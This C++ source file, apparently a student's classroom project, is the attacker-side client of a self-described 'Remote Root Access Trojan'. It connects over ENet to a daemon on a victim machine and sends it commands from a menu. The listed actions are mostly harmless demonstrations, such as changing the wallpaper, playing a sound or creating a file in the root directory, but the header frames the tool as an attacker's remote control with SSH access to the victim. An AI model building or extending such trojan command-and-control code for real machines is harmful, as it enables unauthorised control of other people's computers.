/*
    RRAT: Remote Root Access Trojan

    Ogey: La contraparte de RRAT.
    
    Este programa escanea la red local para detectar
    si algún programa está ejecutando el "Demon", el
    cual es el daemon de RRAT.
    Al conectar, se podrán enviar comandos a Demon.

    ------------------------------------------------
    Ejecución:
        - Manual, la ejecuta el atacante desde
        su PC o móvil

    Función:
        1. Enviar "ogey" a todos los ordenadores en la
            red local hasta que uno de ellos responda
            con "rrat".
        
        2. Al conectar con un ordenador, se me mostrará
            la IP de la víctima para poder conectarme
            por SSH
        
        3. Un menú también me permitirá seleccionar
            una acción que se enviará a Demon para que
            se ejecute desde la sesión del usuario.

            Esto se puede usar para abrir ventanas
            o cambiar configuraciones del DE (por
            motivos demostrativos el DE es KDE Plasma)

    ________________________________________________
    Sistemas Informáticos - 1°DAW - 2024
    Por: Javier Sanz Valero
*/

// includes
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iostream>
#include <regex>
#include <stdexcept>
#include <string>
#include <sys/types.h>

// ENet
#include <enet/enet.h>

// Function Prototypes
uint8_t showMenu();
void SendPacket(ENetPeer* peer, const char* data);
void SendCommand(ENetPeer* peer, uint8_t command);

std::string getAddress();

// main
int main() {
    // Initialize ENet
    if (enet_initialize() != 0) {
        std::cout << "An error occurred while initializing ENet.\n";
        return EXIT_FAILURE;
    }

    atexit(enet_deinitialize);

    // We create a client now
    ENetHost* client;

    client = enet_host_create(
        NULL,
        1, // 1 connection (server)
        1, // 1 channel
        0, // Any incoming bandwidth
        0  // Any outcoming bandwidth
    );

    // oops
    if (client == NULL) {
        std::cout << "Can't create client, no Ogey for you.\n";
        return EXIT_FAILURE;
    }

    ENetAddress address;
    ENetEvent event;
    ENetPeer* peer;

    // Set Address
    // TODO: AUTOMATE!
    // enet_address_set_host(&address, "127.0.0.1");
    enet_address_set_host(&address, getAddress().c_str());
    address.port = 7654;

    peer = enet_host_connect(client, &address, 1, 0);
	if(peer == NULL) {
    	std::cout << "Daemon not running! (or something, either way ogey is not ogeying)\n";
		return EXIT_FAILURE;
	}

	if(enet_host_service(client, &event, 5000) > 0 && event.type == ENET_EVENT_TYPE_CONNECT) {
		std::cout << "Connected to RRAT Demon!\n";
	}
	else {
		enet_peer_reset(peer);
		std::cout << "Connection failed :(\n";
		return EXIT_SUCCESS;
	}

    // Send an ogey
    SendPacket(peer, "ogey");

    // Did the server send rrat?
    bool rrat = false;

    // Main loop
    bool running = true;
    while (running) {
        // 1000ms of timeout, no events in 1 second = ENET_EVENT_TYPE_NONE
        while (enet_host_service(client, &event, 1000) > 0) {
            switch (event.type) {
                case ENET_EVENT_TYPE_CONNECT:
                    // The server connected (?)
                    std::cout << "huh?\n";
                    break;
                
                case ENET_EVENT_TYPE_RECEIVE:
                    // The daemon sent something
                    // Is it a "rrat"?
                    if (!strcmp((const char*)event.packet->data, "rrat\0")) {
                        rrat = true;
                        std::cout << "Connected!\n";
                    }

                    // We show the message
                    std::cout <<
                        "[RECEIVED FROM RRAT] " <<
                        (const char*)event.packet->data <<
                        "\n"
                    ;

                    // Destroy packet
                    enet_packet_destroy(event.packet);
                    break;

                case ENET_EVENT_TYPE_DISCONNECT:
                    // The daemon left, what the f*ck? It's the server!
                    std::cout << "Server disconnected. The daemon may be dead\n";
                    std::cout << "Check status of daemon with SSH.\n";
                    break;

                case ENET_EVENT_TYPE_NONE:
                    // Wait lmao
                    break;
            }
        }

        // After waiting for a maximum of 1000ms, we get input from the user

        // Show the menu and get the input, which is the command ID
        uint8_t userInput = showMenu();

        // Do we want to exit?
        if (userInput < 1) {
            enet_peer_disconnect_now(peer, 0);
            running = false;
        } else {
            SendCommand(peer, userInput);
        }
    }

    enet_host_destroy(client);
} // main

// Function definitions
void SendPacket(ENetPeer* peer, const char* data) {
	ENetPacket* packet = enet_packet_create(data, strlen(data) + 1, ENET_PACKET_FLAG_RELIABLE);
	enet_peer_send(peer, 0, packet);
}
void SendCommand(ENetPeer* peer, uint8_t command) {
	ENetPacket* packet = enet_packet_create(&command, sizeof(uint8_t), ENET_PACKET_FLAG_RELIABLE);
	enet_peer_send(peer, 0, packet);
}

uint8_t showMenu() {
    std::cout <<
        "Available commands:\n"
        "1. [TEST] Show username of remote user\n"
        "2. [TEST] Create a foo.bar file in the root directory\n"
        "3. Play a vineboom sound effect\n"
        "4. Open the presentation\n"
        "5. Change wallpaper \n"
        "exit. Disconnects from the Demon\n"
    ;
    // The maximum command ID we can input
    const uint8_t MAX_ENTRY = 5;

    uint8_t input = 0; // Value for Exit
    bool validInput = false;
    while (!validInput) {
        // get input as a String, then parse
        std::string sinput;

        std::cout << "Select a command: ";
        std::getline(std::cin, sinput);

        // Check if it's exit
        if (sinput == "exit") {
            validInput = true;
            input = 0; // we want to exit
            continue;
        }

        // Check that it's a number
        std::regex reg("^[0-9]{1,10}$");
        if (!std::regex_match(sinput, reg)) {
            std::cout << "The input must be a whole number\n";
            continue;
        }

        input = std::stoi(sinput);

        // Check that it's in the range
        if (input < 1 || input > MAX_ENTRY) {
            std::cout << "The number must be a command.\n";
            continue;
        }

        // If we pass the checks and make it to the end of the
        // loop, we exit it
        validInput = true;
    }

    return input;
}

std::string getAddress() {
    std::ifstream file("addr");

    if (!file) {
        std::cout << "Continuing at localhost!\n"
            "Create an \"addr\" file and store the address there!\n";
        return "127.0.0.1"; // Default, test
    }

    std::string line;
    getline(file, line);

    std::cout << "ADDRESS: " + line + "\n";

    file.close();
    return line;
}